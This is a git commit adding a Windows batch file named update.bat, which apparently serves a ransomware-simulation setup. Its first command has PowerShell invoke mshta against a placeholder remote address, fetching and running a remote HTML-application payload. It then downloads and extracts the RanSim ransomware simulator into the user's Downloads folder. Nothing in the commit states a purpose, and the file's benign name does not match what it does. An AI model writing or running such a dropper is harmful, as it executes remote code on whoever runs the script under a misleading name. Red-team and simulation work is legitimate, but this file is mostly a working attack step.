3d8f6a499d5b68f5fb44dae388db9653a0bd84c5
leonlamsc <140391766+leonlamsc@users.noreply.github.com>
2023-12-10 14:09:27 -0500

    Add files via upload

---
+++ update.bat
@@ -0,0 +1,16 @@
+@echo off
+setlocal
+powershell.exe -Command "mshta http://<ip address>/<endpoint>"
+rem Define variables
+#installing the RanSim from the github
+set "githubUrl=https://github.com/lawndoc/RanSim/archive/main.zip"
+set "outputPath=%USERPROFILE%\Downloads\ransom.zip"
+set "extractPath=%USERPROFILE%\Downloads\"
+
+rem Download the ZIP archive
+powershell.exe -command "Invoke-WebRequest -Uri %githubUrl% -OutFile %outputPath%"
+
+rem Extract the contents of the ZIP archive
+powershell.exe -command "Expand-Archive -Path %outputPath% -DestinationPath %extractPath% -Force"
+endlocal
+pause
